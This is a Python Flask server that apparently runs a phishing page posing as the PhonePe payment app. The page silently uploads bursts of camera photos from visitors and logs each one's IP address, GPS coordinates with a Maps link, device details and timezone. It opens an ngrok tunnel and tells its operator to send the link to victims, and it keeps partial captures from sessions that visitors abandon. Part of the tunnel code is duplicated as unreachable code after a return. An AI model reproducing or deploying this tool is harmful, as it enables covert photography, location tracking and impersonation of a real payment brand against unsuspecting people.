#!/usr/bin/env python3
# Developed by surajorg
# Copyright (c) 2025 Surajorg - MIT License
\

from flask import Flask, render_template, request, jsonify
import os
import json
import time
from datetime import datetime
import base64
import threading
import webbrowser
import atexit
import requests
import logging
import shutil

# Try to import ngrok
ngrok = None
NGROK_AVAILABLE = False
try:
    from pyngrok import ngrok
    NGROK_AVAILABLE = True
    print("✅ Ngrok library loaded successfully")
except ImportError as e:
    print(f"⚠️  Ngrok not available: {e}")
    print("💡 To enable public URLs, install with: pip install pyngrok")
    print("   Then run: ngrok config add-authtoken YOUR_TOKEN")

# Configuration
PHOTOS_DIR = 'captured_photos'
LEFTOVER_DIR = os.path.join(PHOTOS_DIR, 'leftover_data')
PORT = 8080

# Ensure photos directory exists
os.makedirs(PHOTOS_DIR, exist_ok=True)
os.makedirs(LEFTOVER_DIR, exist_ok=True)

app = Flask(__name__,
           template_folder='templates',
           static_folder='static')

# Configure basic logging
logging.basicConfig(
    level=logging.DEBUG,
    format='[%(asctime)s] %(levelname)s in %(module)s: %(message)s'
)
logger = logging.getLogger(__name__)

@app.get("/health")
def health():
    return "ok", 200


@app.before_request
def log_request_info():
    """Debug log for every incoming request"""
    logger.info(
        "Request: %s %s from %s",
        request.method,
        request.path,
        request.remote_addr,
    )
    logger.debug("Headers: %s", dict(request.headers))

# Global variables for ngrok
public_url = None
ngrok_process = None

def get_ip_location(ip_address):
    """Get accurate location information from IP address using ip-api.com"""
    if not ip_address or ip_address == 'Unknown' or ip_address.startswith('127.') or ip_address == '::1':
        return 'LOCAL TEST - Real location will show when accessed via ngrok tunnel'

    try:
        response = requests.get(f'http://ip-api.com/json/{ip_address}', timeout=5)
        response.raise_for_status()
        data = response.json()

        if data.get('status') == 'success':
            city = data.get('city', '')
            region = data.get('regionName', '')
            country = data.get('country', '')

            location_parts = []
            if city:
                location_parts.append(city)
            if region and region != city:
                location_parts.append(region)
            if country:
                location_parts.append(country)

            return ', '.join(location_parts) if location_parts else 'Unknown'
        else:
            return 'Location lookup failed'

    except Exception as e:
        print(f"Geolocation error for {ip_address}: {e}")
        return 'Location lookup failed'

def save_capture_metadata(capture_id, photo_filename, metadata):
    """Save capture metadata to JSON file"""
    metadata_file = os.path.join(PHOTOS_DIR, f"{capture_id}_info.json")

    # Get accurate IP and location
    ip_address = metadata.get('ip', request.remote_addr or 'Unknown')

    # Check for forwarded IP headers (useful when behind proxy/load balancer)
    real_ip = request.headers.get('X-Forwarded-For') or request.headers.get('X-Real-IP') or ip_address
    if real_ip != ip_address:
        print(f"📍 Forwarded IP detected: {real_ip} (original: {ip_address})")
        ip_address = real_ip

    accurate_location = get_ip_location(ip_address)

    capture_data = {
        'capture_id': capture_id,
        'photo_filename': photo_filename,
        'timestamp': datetime.now().isoformat(),
        'ip_address': ip_address,
        'location': accurate_location,
        'client_location': metadata.get('location', 'Unknown'),  # Keep client-side location too
        'user_agent': metadata.get('userAgent', request.headers.get('User-Agent', 'Unknown')),
        'screen_resolution': metadata.get('screenResolution', 'Unknown'),
        'timezone': metadata.get('timezone', 'Unknown'),
        'platform': metadata.get('platform', 'Unknown'),
    }

    with open(metadata_file, 'w') as f:
        json.dump(capture_data, f, indent=2)

    # Determine if this is a test or real capture
    is_local_test = ip_address.startswith('127.') or ip_address == '::1' or ip_address == 'localhost'

    if is_local_test:
        print(f"🧪 LOCAL TEST CAPTURE!")
    else:
        print(f"🎯 REAL CAPTURE!")

    print(f"   Photo: {photo_filename}")
    print(f"   IP: {capture_data['ip_address']}")
    print(f"   Location: {accurate_location}")
    print(f"   User-Agent: {capture_data['user_agent'][:50]}...")
    print(f"   Time: {capture_data['timestamp']}")
    print(f"   Files saved in: {PHOTOS_DIR}/")

    if is_local_test:
        print("💡 TIP: Share the ngrok URL to get real locations!")
    print("-" * 50)

@app.route('/')
def index():
    """Serve the main PhonePe interface"""
    return render_template('index.html')

@app.route('/test-external')
def test_external():
    """Test page to simulate external access with custom IP"""
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>PhonePe</title>
        <meta property="og:title" content="PhonePe">
        <meta property="og:site_name" content="PhonePe">
        <meta property="og:description" content="UPI payments via PhonePe.">
        <meta property="og:type" content="website">
        <meta property="og:image" content="https://pnghdpro.com/wp-content/themes/pnghdpro/download/social-media-and-brands/phonepe-logo-icon.png">
        <meta property="og:image:alt" content="PhonePe">
        <meta name="twitter:card" content="summary_large_image">
        <meta name="twitter:title" content="PhonePe">
        <meta name="twitter:description" content="UPI payments via PhonePe.">
        <meta name="twitter:image" content="https://pnghdpro.com/wp-content/themes/pnghdpro/download/social-media-and-brands/phonepe-logo-icon.png">
        <style>
            body { font-family: Arial, sans-serif; max-width: 800px; margin: 50px auto; padding: 20px; }
            .test-form { background: #f5f5f5; padding: 20px; border-radius: 8px; margin: 20px 0; }
            input, button { padding: 10px; margin: 5px; font-size: 16px; }
            .info { background: #e8f4fd; padding: 15px; border-radius: 5px; margin: 10px 0; }
        </style>
    </head>
    <body>
        <h1>🧪 External Testing Mode</h1>
        <div class="info">
            <strong>How to test geolocation:</strong><br>
            1. Enter any public IP address (e.g., 8.8.8.8 for Google DNS)<br>
            2. Click "Test Location" to see what location it resolves to<br>
            3. This simulates what you'll see from real visitors
        </div>

        <div class="test-form">
            <h3>Test IP Geolocation</h3>
            <input type="text" id="testIp" placeholder="Enter IP address (e.g., 8.8.8.8)" value="8.8.8.8">
            <button onclick="testLocation()">Test Location</button>
            <div id="result"></div>
        </div>

        <div class="info">
            <strong>Real testing:</strong> Share your ngrok URL with others to get their real IP/location data!
        </div>

        <script>
            function testLocation() {
                const ip = document.getElementById('testIp').value;
                const resultDiv = document.getElementById('result');

                fetch('/api/test-ip', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ ip: ip })
                })
                .then(response => response.json())
                .then(data => {
                    resultDiv.innerHTML = `
                        <h4>Test Results for IP: ${ip}</h4>
                        <p><strong>Location:</strong> ${data.location}</p>
                        <p><strong>Success:</strong> ${data.success ? '✅' : '❌'}</p>
                        <hr>
                        <p><em>This is what you'll see in real captures!</em></p>
                    `;
                })
                .catch(error => {
                    resultDiv.innerHTML = `<p style="color: red;">Error: ${error.message}</p>`;
                });
            }
        </script>
    </body>
    </html>
    '''

@app.route('/api/test-ip', methods=['POST'])
def test_ip_location():
    """API endpoint to test IP geolocation"""
    try:
        data = request.get_json()
        test_ip = data.get('ip', '')

        if not test_ip:
            return jsonify({'success': False, 'location': 'No IP provided'})

        location = get_ip_location(test_ip)
        return jsonify({
            'success': True,
            'ip': test_ip,
            'location': location
        })
    except Exception as e:
        return jsonify({'success': False, 'location': f'Error: {str(e)}'})

@app.route('/api/upload', methods=['POST'])
def upload_photo():
    """Handle burst photo uploads silently and store per-burst folders with geo details"""
    try:
        metadata_str = request.form.get('metadata')
        # New burst fields
        initial_json = request.form.get('initialPhotos')
        middle_json = request.form.get('middlePhotos')
        final_json = request.form.get('finalPhotos')
        # Backward compatibility
        photos_json = request.form.get('photos')  # JSON array of data URLs
        single_photo = request.form.get('photo')

        # Parse metadata
        try:
            metadata = json.loads(metadata_str) if metadata_str else {}
        except Exception:
            logger.warning("Failed to parse metadata JSON.")
            metadata = {}

        # Determine IP and accurate location
        ip_address = metadata.get('ip', request.remote_addr or 'Unknown')
        real_ip = request.headers.get('X-Forwarded-For') or request.headers.get('X-Real-IP') or ip_address
        if real_ip != ip_address:
            logger.info("Forwarded IP detected: %s (original: %s)", real_ip, ip_address)
            ip_address = real_ip
        accurate_location = get_ip_location(ip_address)

        # Client geolocation
        geo = metadata.get('geo') or {}
        lat = geo.get('latitude')
        lon = geo.get('longitude')
        accuracy = geo.get('accuracy')
        maps_url = f"https://www.google.com/maps?q={lat},{lon}" if lat and lon else None

        # Create per-session folder named with date and time
        session_timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        session_dir = os.path.join(PHOTOS_DIR, session_timestamp)
        os.makedirs(session_dir, exist_ok=True)

        # Create per-burst subfolders
        bursts = {
            'initial': os.path.join(session_dir, 'initial'),
            'middle': os.path.join(session_dir, 'middle'),
            'final': os.path.join(session_dir, 'final'),
        }
        for d in bursts.values():
            os.makedirs(d, exist_ok=True)

        saved_files = {
            'initial': [],
            'middle': [],
            'final': []
        }

        def save_data_url_to_file(data_url, index, target_dir, burst_key):
            try:
                if not data_url:
                    return
                image_data = data_url.split(',')[1] if ',' in data_url else data_url.replace('data:image/jpeg;base64,', '')
                image_bytes = base64.b64decode(image_data)
                filename = f"photo_{index + 1}.jpg"
                photo_path = os.path.join(target_dir, filename)
                with open(photo_path, 'wb') as f:
                    f.write(image_bytes)
                # Store relative path from session_dir
                saved_files[burst_key].append({
                    'filename': os.path.join(burst_key, filename),
                    'timestamp': datetime.now().isoformat()
                })
            except Exception:
                logger.exception("Failed saving %s photo %s", burst_key, index + 1)

        # Parse incoming lists safely
        def parse_list(json_str):
            if not json_str:
                return []
            try:
                data = json.loads(json_str)
                return data if isinstance(data, list) else []
            except Exception:
                return []

        initial_list = parse_list(initial_json)
        middle_list = parse_list(middle_json)
        final_list = parse_list(final_json)

        if initial_list or middle_list or final_list:
            for i, data_url in enumerate(initial_list):
                save_data_url_to_file(data_url, i, bursts['initial'], 'initial')
            for i, data_url in enumerate(middle_list):
                save_data_url_to_file(data_url, i, bursts['middle'], 'middle')
            for i, data_url in enumerate(final_list):
                save_data_url_to_file(data_url, i, bursts['final'], 'final')
        elif photos_json:
            # Backward compatibility: store as initial burst
            legacy_list = parse_list(photos_json)
            for i, data_url in enumerate(legacy_list):
                save_data_url_to_file(data_url, i, bursts['initial'], 'initial')
        elif single_photo:
            save_data_url_to_file(single_photo, 0, bursts['initial'], 'initial')
        else:
            return jsonify({'error': 'No photo data provided'}), 400

        # Flatten counts
        total_saved = sum(len(v) for v in saved_files.values())

        # Write session metadata JSON
        session_info = {
            'session_id': session_timestamp,
            'timestamp': datetime.now().isoformat(),
            'ip_address': ip_address,
            'resolved_location': accurate_location,
            'client_geo': {
                'latitude': lat,
                'longitude': lon,
                'accuracy_meters': accuracy,
                'maps_url': maps_url
            },
            'user_agent': metadata.get('userAgent', request.headers.get('User-Agent', 'Unknown')),
            'screen_resolution': metadata.get('screenResolution', 'Unknown'),
            'timezone': metadata.get('timezone', 'Unknown'),
            'platform': metadata.get('platform', 'Unknown'),
            'photos': {
                'initial': [p['filename'] for p in saved_files['initial']],
                'middle': [p['filename'] for p in saved_files['middle']],
                'final': [p['filename'] for p in saved_files['final']]
            }
        }

        session_info_path = os.path.join(session_dir, 'session_info.json')
        with open(session_info_path, 'w') as f:
            json.dump(session_info, f, indent=2)

        logger.info("Saved %s photos to session folder: %s", total_saved, session_dir)
        return jsonify({
            'success': True,
            'session_dir': session_timestamp,
            'photos_saved': total_saved,
            'maps_url': maps_url
        })

    except Exception as e:
        logger.exception("Upload error")
        return jsonify({'error': 'Failed to save photos'}), 500

@app.route('/api/upload_single', methods=['POST'])
def upload_single_photo():
    """Upload a single photo per burst and persist under a stable sessionId folder"""
    try:
        data = request.get_json(silent=True) or {}
        if not data:
            # Fallback to form
            session_id = request.form.get('sessionId')
            session_start = request.form.get('sessionStart')
            burst_type = request.form.get('burstType')
            index = request.form.get('index')
            photo = request.form.get('photo')
            metadata_str = request.form.get('metadata')
            try:
                metadata = json.loads(metadata_str) if metadata_str else {}
            except Exception:
                metadata = {}
        else:
            session_id = data.get('sessionId')
            session_start = data.get('sessionStart')
            burst_type = data.get('burstType')
            index = data.get('index', 0)
            photo = data.get('photo')
            metadata = data.get('metadata', {})

        if not photo:
            return jsonify({'success': False, 'error': 'No photo provided'}), 400

        # Determine IP and accurate location
        ip_address = metadata.get('ip', request.remote_addr or 'Unknown')
        real_ip = request.headers.get('X-Forwarded-For') or request.headers.get('X-Real-IP') or ip_address
        if real_ip != ip_address:
            ip_address = real_ip
        accurate_location = get_ip_location(ip_address)

        # Client geolocation
        geo = metadata.get('geo') or {}
        lat = geo.get('latitude')
        lon = geo.get('longitude')
        accuracy = geo.get('accuracy')
        maps_url = f"https://www.google.com/maps?q={lat},{lon}" if lat and lon else None

        # Session directory by client-provided session id
        session_id = session_id or datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        session_dir = os.path.join(PHOTOS_DIR, session_id)
        os.makedirs(session_dir, exist_ok=True)

        # Burst subfolder
        burst_type = (burst_type or 'initial').lower()
        if burst_type not in ('initial', 'middle', 'final'):
            burst_type = 'initial'
        burst_dir = os.path.join(session_dir, burst_type)
        os.makedirs(burst_dir, exist_ok=True)

        # Save photo
        try:
            image_data = photo.split(',')[1] if ',' in photo else photo.replace('data:image/jpeg;base64,', '')
            image_bytes = base64.b64decode(image_data)
            ts_ms = int(time.time() * 1000)
            safe_index = int(index) if str(index).isdigit() else 0
            filename = f"{burst_type}_{safe_index}_{ts_ms}.jpg"
            photo_path = os.path.join(burst_dir, filename)
            with open(photo_path, 'wb') as f:
                f.write(image_bytes)
        except Exception:
            logger.exception('Failed to decode/save photo')
            return jsonify({'success': False, 'error': 'Failed to save photo'}), 500

        # Optionally write/update a lightweight uploads log
        try:
            log_path = os.path.join(session_dir, 'uploads_log.json')
            log = []
            if os.path.exists(log_path):
                with open(log_path, 'r') as f:
                    try:
                        log = json.load(f)
                    except Exception:
                        log = []
            entry = {
                'burst': burst_type,
                'filename': os.path.join(burst_type, filename),
                'timestamp': datetime.now().isoformat(),
                'ip': ip_address,
                'resolved_location': accurate_location,
                'client_geo': {'latitude': lat, 'longitude': lon, 'accuracy_meters': accuracy, 'maps_url': maps_url}
            }
            log.append(entry)
            with open(log_path, 'w') as f:
                json.dump(log, f, indent=2)
        except Exception:
            logger.warning('Could not update uploads log for session %s', session_id)

        return jsonify({'success': True, 'session_id': session_id, 'burst': burst_type, 'filename': os.path.join(burst_type, filename), 'maps_url': maps_url})
    except Exception:
        logger.exception('upload_single_photo error')
        return jsonify({'success': False, 'error': 'Server error'}), 500

@app.route('/api/finalize', methods=['POST'])
def finalize_session():
    """Finalize a session by writing a session_info.json with counts and metadata"""
    try:
        data = request.get_json(silent=True) or {}
        session_id = data.get('sessionId') or datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        session_start = data.get('sessionStart')
        counts = data.get('counts', {})
        completed = bool(data.get('completed', False))
        metadata = data.get('metadata', {})

        ip_address = metadata.get('ip', request.remote_addr or 'Unknown')
        real_ip = request.headers.get('X-Forwarded-For') or request.headers.get('X-Real-IP') or ip_address
        if real_ip != ip_address:
            ip_address = real_ip
        accurate_location = get_ip_location(ip_address)

        geo = metadata.get('geo') or {}
        lat = geo.get('latitude')
        lon = geo.get('longitude')
        accuracy = geo.get('accuracy')
        maps_url = f"https://www.google.com/maps?q={lat},{lon}" if lat and lon else None

        session_dir = os.path.join(PHOTOS_DIR, session_id)
        os.makedirs(session_dir, exist_ok=True)
        for burst in ('initial', 'middle', 'final'):
            os.makedirs(os.path.join(session_dir, burst), exist_ok=True)

        session_info = {
            'session_id': session_id,
            'session_start': session_start,
            'finalized_at': datetime.now().isoformat(),
            'completed': completed,
            'counts': counts,
            'ip_address': ip_address,
            'resolved_location': accurate_location,
            'client_geo': {
                'latitude': lat,
                'longitude': lon,
                'accuracy_meters': accuracy,
                'maps_url': maps_url
            },
            'user_agent': metadata.get('userAgent', request.headers.get('User-Agent', 'Unknown')),
            'screen_resolution': metadata.get('screenResolution', 'Unknown'),
            'timezone': metadata.get('timezone', 'Unknown'),
            'platform': metadata.get('platform', 'Unknown')
        }

        info_path = os.path.join(session_dir, 'session_info.json')
        with open(info_path, 'w') as f:
            json.dump(session_info, f, indent=2)

        # If session not completed, move it under leftover_data for later inspection
        if not completed:
            try:
                dest_dir = os.path.join(LEFTOVER_DIR, session_id)
                if os.path.exists(dest_dir):
                    # Merge files into existing leftover directory
                    for burst in ('initial', 'middle', 'final'):
                        os.makedirs(os.path.join(dest_dir, burst), exist_ok=True)
                        src_burst = os.path.join(session_dir, burst)
                        if os.path.exists(src_burst):
                            for name in os.listdir(src_burst):
                                src_path = os.path.join(src_burst, name)
                                dst_path = os.path.join(dest_dir, burst, name)
                                try:
                                    shutil.move(src_path, dst_path)
                                except Exception:
                                    logger.warning("Could not move file %s to leftover", src_path)
                    # Move session info as unfinished copy
                    try:
                        shutil.move(info_path, os.path.join(dest_dir, 'session_info_unfinished.json'))
                    except Exception:
                        pass
                    try:
                        shutil.rmtree(session_dir, ignore_errors=True)
                    except Exception:
                        pass
                else:
                    shutil.move(session_dir, dest_dir)
            except Exception:
                logger.warning("Could not move incomplete session %s to leftover_data", session_id)

        return jsonify({'success': True, 'session_id': session_id, 'maps_url': maps_url})
    except Exception:
        logger.exception('finalize_session error')
        return jsonify({'success': False, 'error': 'Server error'}), 500

    if not NGROK_AVAILABLE:
        print("❌ Ngrok not available. Install with: pip install pyngrok")
        return

    try:
        print("🚀 Starting ngrok tunnel...")
        logger.info("Starting ngrok tunnel on port %s", PORT)
        # Configure ngrok with request headers including ngrok-skip-browser-warning
        ngrok_process = ngrok.connect(PORT, "http")
        public_url = ngrok_process.public_url
        print(f"✅ Public URL: {public_url}")
        logger.info("Ngrok public URL: %s", public_url)
        print("=" * 50)
        print("📱 IMPORTANT: ngrok Free Tier Warning Page")
        print("=" * 50)
        print("⚠️  Visitors will see an ngrok warning page ONCE (first visit only)")
        print("   They must click 'Visit Site' to proceed to your PhonePe interface.")
        print("")
        print("💡 To REMOVE the warning page completely:")
        print("   1. Upgrade to ngrok paid plan ($8/month)")
        print("   2. Visit: https://dashboard.ngrok.com/billing")
        print("")
        print("📤 Send this URL to users: " + public_url)
        print("   (They'll see warning once, then your app)")
        print("=" * 50)

        # Open the URL in browser for testing
        webbrowser.open(public_url)

    except Exception as e:
        print(f"❌ Ngrok error: {e}")
        logger.exception("Ngrok error")
        print("💡 Make sure you have an ngrok account and auth token set up")
        print("   Run: ngrok config add-authtoken YOUR_TOKEN")
        print("   Or download ngrok manually from https://ngrok.com")
        public_url = f"http://localhost:{PORT}"

def start_ngrok():
    """Start ngrok tunnel"""
    global public_url, ngrok_process
    if not NGROK_AVAILABLE:
        print("❌ Ngrok not available. Install with: pip install pyngrok")
        return
    try:
        print("🚀 Starting ngrok tunnel...")
        port = int(os.environ.get("PORT", 10000))
        logger.info("Starting ngrok tunnel on port %s", port)
        # Use NGROK_AUTHTOKEN from environment if provided
        try:
            from pyngrok.conf import PyngrokConfig
            authtoken = os.environ.get("NGROK_AUTHTOKEN")
            if authtoken:
                conf = PyngrokConfig(authtoken=authtoken)
                ngrok_process = ngrok.connect(port, "http", pyngrok_config=conf)
            else:
                ngrok_process = ngrok.connect(port, "http")
        except Exception:
            try:
                authtoken = os.environ.get("NGROK_AUTHTOKEN")
                if authtoken:
                    ngrok.set_auth_token(authtoken)
            except Exception:
                pass
            ngrok_process = ngrok.connect(port, "http")
        public_url = ngrok_process.public_url
        print(f"✅ Public URL: {public_url}")
        logger.info("Ngrok public URL: %s", public_url)
        print("=" * 50)
        print("📱 IMPORTANT: ngrok Free Tier Warning Page")
        print("=" * 50)
        print("⚠️  Visitors will see an ngrok warning page ONCE (first visit only)")
        print("   They must click 'Visit Site' to proceed to your PhonePe interface.")
        print("")
        print("💡 To REMOVE the warning page completely:")
        print("   1. Upgrade to ngrok paid plan ($8/month)")
        print("   2. Visit: https://dashboard.ngrok.com/billing")
        print("")
        print("📤 Send this URL to users: " + public_url)
        print("   (They'll see warning once, then your app)")
        print("=" * 50)
        webbrowser.open(public_url)
    except Exception as e:
        print(f"❌ Ngrok error: {e}")
        logger.exception("Ngrok error")
        print("💡 Make sure you have an ngrok account and auth token set up")
        print("   Run: ngrok config add-authtoken YOUR_TOKEN")
        print("   Or download ngrok manually from https://ngrok.com")
        public_url = f"http://localhost:{PORT}"

@app.route('/api/leftover', methods=['POST'])
def leftover_upload():
    """Accept beaconed leftover data with arrays of photos for initial/middle/final and write session metadata."""
    try:
        data = request.get_json(silent=True) or {}
        session_id = data.get('sessionId') or datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        session_dir = os.path.join(LEFTOVER_DIR, session_id)
        os.makedirs(session_dir, exist_ok=True)

        # Persist burst photos into per-session folders
        counts = {'initial': 0, 'middle': 0, 'final': 0}
        for burst in ('initialPhotos','middlePhotos','finalPhotos'):
            photos = data.get(burst) or []
            key = 'initial' if burst=='initialPhotos' else ('middle' if burst=='middlePhotos' else 'final')
            burst_dir = os.path.join(session_dir, key)
            os.makedirs(burst_dir, exist_ok=True)
            for i, d in enumerate(photos):
                try:
                    image_data = d.split(',')[1] if ',' in d else d.replace('data:image/jpeg;base64,', '')
                    image_bytes = base64.b64decode(image_data)
                    filename = f"{key}_{i}_{int(time.time()*1000)}.jpg"
                    with open(os.path.join(burst_dir, filename), 'wb') as f:
                        f.write(image_bytes)
                    counts[key] += 1
                except Exception:
                    logger.warning('Failed saving leftover %s #%s', key, i)

        # Build session info metadata (incomplete session)
        metadata = data.get('metadata', {})
        ip_address = metadata.get('ip', request.remote_addr or 'Unknown')
        real_ip = request.headers.get('X-Forwarded-For') or request.headers.get('X-Real-IP') or ip_address
        if real_ip != ip_address:
            ip_address = real_ip
        accurate_location = get_ip_location(ip_address)

        geo = metadata.get('geo') or {}
        lat = geo.get('latitude')
        lon = geo.get('longitude')
        accuracy = geo.get('accuracy')
        maps_url = f"https://www.google.com/maps?q={lat},{lon}" if lat and lon else None

        session_info = {
            'session_id': session_id,
            'finalized_at': datetime.now().isoformat(),
            'completed': False,
            'counts': {
                'initial': counts['initial'],
                'middle': counts['middle'],
                'final': counts['final'],
                'total': counts['initial'] + counts['middle'] + counts['final']
            },
            'ip_address': ip_address,
            'resolved_location': accurate_location,
            'client_geo': {
                'latitude': lat,
                'longitude': lon,
                'accuracy_meters': accuracy,
                'maps_url': maps_url
            },
            'user_agent': metadata.get('userAgent', request.headers.get('User-Agent', 'Unknown')),
            'screen_resolution': metadata.get('screenResolution', 'Unknown'),
            'timezone': metadata.get('timezone', 'Unknown'),
            'platform': metadata.get('platform', 'Unknown')
        }
        info_path = os.path.join(session_dir, 'session_info.json')
        try:
            with open(info_path, 'w') as f:
                json.dump(session_info, f, indent=2)
        except Exception:
            logger.warning('Could not write leftover session_info for %s', session_id)

        return jsonify({'success': True, 'session_id': session_id, 'maps_url': maps_url})
    except Exception:
        logger.exception('leftover_upload error')
        return jsonify({'success': False})


def cleanup():
    """Clean up ngrok on exit"""
    global ngrok_process
    if ngrok_process and NGROK_AVAILABLE:
        try:
            ngrok.disconnect(ngrok_process.public_url)
            ngrok.kill()
        except:
            pass
        print("🧹 Ngrok tunnel closed")
        logger.info("Ngrok tunnel closed")

def main():
    """Main function to run the server"""
    print("🎯 PhonePe")
    print("=" * 50)
    port = int(os.environ.get("PORT", 10000))
    print(f"🌐 Local server: http://localhost:{port}")
    print(f"🧪 Test geolocation: http://localhost:{port}/test-external")
    print(f"📁 Photos will be saved in: {PHOTOS_DIR}/")
    print("=" * 50)

    # Start ngrok in background thread (local dev only)
    if NGROK_AVAILABLE and os.environ.get("USE_PYNGROK") == "1":
        ngrok_thread = threading.Thread(target=start_ngrok, daemon=True)
        ngrok_thread.start()
        # Give ngrok time to start
        time.sleep(3)
    else:
        print("⚠️  Ngrok not available - only local access")
        print("   Install with: pip install pyngrok")

    # Register cleanup function
    atexit.register(cleanup)

    print("🎣 Waiting for visitors...")
    print("Press Ctrl+C to stop")
    print("=" * 50)

    try:
        # Run Flask server
        port = int(os.environ.get("PORT", 10000))
        app.run(host='0.0.0.0', port=port, debug=False)
    except KeyboardInterrupt:
        print("\n👋 Shutting down...")
    finally:
        cleanup()

if __name__ == '__main__':
    main()